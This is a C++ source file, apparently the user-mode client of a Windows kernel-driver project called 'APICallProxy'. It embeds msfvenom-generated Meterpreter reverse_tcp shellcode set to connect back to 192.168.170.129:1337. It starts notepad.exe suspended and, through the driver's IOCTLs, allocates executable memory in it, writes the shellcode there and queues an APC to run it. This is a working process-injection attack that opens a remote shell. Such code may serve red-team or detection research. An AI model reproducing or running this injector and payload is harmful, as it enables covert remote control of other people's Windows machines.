// UserClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>

#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID* PCLIENT_ID;

typedef LONG KPRIORITY;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
#ifdef MIDL_PASS
	[size_is(MaximumLength / 2), length_is((Length) / 2)] USHORT* Buffer;
#else // MIDL_PASS
	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH   Buffer;
#endif // MIDL_PASS
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
} VM_COUNTERS;
typedef VM_COUNTERS* PVM_COUNTERS;

typedef struct _SYSTEM_THREADS_ {
	LARGE_INTEGER  KernelTime;
	LARGE_INTEGER  UserTime;
	LARGE_INTEGER  CreateTime;
	ULONG          WaitTime;
	PVOID          StartAddress;
	CLIENT_ID      ClientId;
	KPRIORITY      Priority;
	KPRIORITY      BasePriority;
	ULONG          ContextSwitchCount;
	LONG           State;
	LONG           WaitReason;
} SYSTEM_THREADS, * PSYSTEM_THREADS;

typedef struct _SYSTEM_PROCESSES_ {
	ULONG            NextEntryDelta;
	ULONG            ThreadCount;
	ULONG            Reserved1[6];
	LARGE_INTEGER    CreateTime;
	LARGE_INTEGER    UserTime;
	LARGE_INTEGER    KernelTime;
	UNICODE_STRING   ProcessName;
	KPRIORITY        BasePriority;
	SIZE_T           ProcessId;
	SIZE_T           InheritedFromProcessId;
	ULONG            HandleCount;
	ULONG            Reserved2[2];
	VM_COUNTERS      VmCounters;

	ULONG PrivatePageCount;// add by achillis

	IO_COUNTERS      IoCounters;
	SYSTEM_THREADS   Threads[1];
} SYSTEM_PROCESSES_, * PSYSTEM_PROCESSES_;

#define SystemProcessInformation 5

typedef struct _SYSTEM_BASIC_INFORMATION_
{
	ULONG Reserved;
	ULONG TimerResolution;
	ULONG PageSize;
	ULONG NumberOfPhysicalPages;
	ULONG LowestPhysicalPageNumber;
	ULONG HighestPhysicalPageNumber;
	ULONG AllocationGranularity;
	ULONG_PTR MinimumUserModeAddress;
	ULONG_PTR MaximumUserModeAddress;
	ULONG_PTR ActiveProcessorsAffinityMask;
	CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION_, * PSYSTEM_BASIC_INFORMATION_;

#define SystemBasicInformation 0


//this shellcode works only on x64 bit OS
unsigned char scode[] =
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.129 LPORT=1337 EXITFUNC=thread -f c
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a"
"\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff"
"\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01"
"\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff"
"\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49"
"\xbc\x02\x00\x05\x39\xc0\xa8\xaa\x81\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00"
"\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41"
"\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a"
"\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2"
"\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff"
"\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff\xd5\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90";


int main(int argc, WCHAR* argv[])
{
	BOOL Status = 1;
	DWORD returned;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE ProcessHandle = NULL;;
	HANDLE ThreadHandle = NULL;
	HANDLE FileHandle = NULL;
	AllocateVirtualMeomryInfo AlocateMemoryInfo{ 0 };
	ReadWriteVirtualMemoryInfo WriteMemoryInfo{ 0 };
	QueueUSerApcInfo APCinfo { 0 };
	CreateFileInfo FileInfo{ 0 };
	DWORD64 ShellCodeSize = 528;
	BYTE* ShellCode = scode;

	printf("This sample only works on win10 x64 Bit OS as x64 Bit Application\n");
	
	HANDLE hDevice = CreateFile(L"\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("Failed To Open Driver Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	WCHAR procname[] = L"c:\\Windows\\notepad.exe";
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess(NULL, (LPWSTR)procname, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("Failed to Create NotePad.exe Error Code 0x%x\n", GetLastError());
		return 0;
	}

	ProcessHandle = pi.hProcess;
	ThreadHandle = pi.hThread;
	

	AlocateMemoryInfo.BaseAddress = NULL;
	AlocateMemoryInfo.RegionSize = ShellCodeSize;
	AlocateMemoryInfo.ProcessHandle = ProcessHandle;
	AlocateMemoryInfo.Protect = PAGE_EXECUTE_READWRITE;
	AlocateMemoryInfo.AllocationType = MEM_RESERVE | MEM_COMMIT;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE, &AlocateMemoryInfo, sizeof(AllocateVirtualMeomryInfo), NULL, NULL, &returned, nullptr);
	if (!Status) {
		printf("Error Allocating RWX Memory in Remote Process\n");
		return 0;
	}
	
	printf("+ Allocated RWX Memory in NotePad Process at %p\n", AlocateMemoryInfo.BaseAddress);

	WriteMemoryInfo.ProcessHandle = (HANDLE)ProcessHandle;
	WriteMemoryInfo.Data = (unsigned char*)ShellCode;
	WriteMemoryInfo.BaseAddress = AlocateMemoryInfo.BaseAddress;
	WriteMemoryInfo.DataLen = ShellCodeSize;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WRITE_PROCESS_MEMORY, &WriteMemoryInfo, sizeof(ReadWriteVirtualMemoryInfo), nullptr, NULL, &returned, nullptr);
	if (!Status) {
		printf("+ Failed Write ShellCode to Remote Process Address Space\n");
		return 0;
	}

	printf("+ Finished Write ShellCode to Remote Process Address Space\n");

	Sleep(50);

	APCinfo.ThreadHandle = ThreadHandle;
	APCinfo.ProcAddres = (DWORD64)AlocateMemoryInfo.BaseAddress;
	APCinfo.ArgumentData = NULL;			// you can add any argument, but you need to write it to the address space of the injected process first
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_QUEUE_APC, &APCinfo, sizeof(QueueUSerApcInfo), nullptr, 0, &returned, nullptr);
	if (!Status) {
		printf("+ Failed Quing APC to Remote Process Main thread\n");
		return 0;
	}

	printf("+ Finished Quing APC to Remote Process Main thread\n");


	//Close Handle to Remote Process and its main Thread
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &ProcessHandle, sizeof(HANDLE), nullptr, 0, &returned, nullptr);
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &ThreadHandle, sizeof(HANDLE), nullptr, 0, &returned, nullptr);

	return 0;
}
